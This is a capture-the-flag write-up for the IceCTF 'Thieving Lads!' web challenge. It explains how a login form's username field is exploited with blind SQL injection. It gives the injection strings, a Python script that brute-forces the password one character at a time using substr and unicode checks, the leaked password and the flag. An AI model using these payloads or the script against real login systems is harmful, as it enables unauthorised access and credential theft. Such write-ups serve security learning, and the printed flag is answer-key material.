## Thieving Lads!

> The Yule Lads are back at it again and have been stealing flags! They've hidden them behind an authenticated service, which they're 100% sure is fully secured. Can you prove them wrong and get our precious flags back?

We are given a webpage with a username field and a password field. Putting the character ``'`` into the username yeilds an "SQL Error". This means the form is vulnerable to SQL Injection.

Using the following injnection:

```
' or substr(username,1,1) = 'a' or '
```

I am able to get the error Invalid Password. Unfortunately, the password field is not vulnerable to injection. However, we can use Blind SQLi tactics to leak the password using the username field.

We are able to use substring to try and brute force each character of the password. However, using just substring does not work as it is case insensitive while the login form requires a case sensitive password. Because of this, I get the ascii value using ``unicode`` and try to find the first character of the password. Here is a sample username injection with this logic:

```
' or substr(username,1,1) = 'a' and unicode(substr(password,1,1)) = 90 or '
```

If the password as position 1 is ascii value 90, then the username will be found at the page will show Invalid Password. If not, then we will get something saying the username is not found as we are using ``AND`` with the injection. 

I wrote a script using this logic:


```python
import requests
import string
import time

#' or substr(username,1,1)) = 'a' or '
ans=""
found = False
for i in range(1, 25):
        for num in range(0,150):
                username = f"' or substr(username,1,1) = 'a' and unicode(substr(password,{i},1)) = {num} or '"
                datafrag = f"' or substr(password,1,1) = '{num}' or '"
                #print(datafrag)
                #exit(1)
                data = {'username': username, 'password': "whocares"}
                url = "http://www.web-theft.vuln.icec.tf/"
                r=requests.post(url, data=data)
                if "Invalid password!" in r.text:
                        ans+=chr(num)
                        print("New Hit!")
                        print(ans)
                #print(r.text)
                #time.sleep(1)
```

And I was able to leak the password: ``idwicpmYeRfkOUkGIG8``

Logging in with the following credentials:

```
username: ' or substr(username,1,1) = 'a' or '
password: idwicpmYeRfkOUkGIG8
```

gives us the flag.

> IceCTF{aT_l3aSt_y0u_d1dNt_g3t_a_p0tat0} 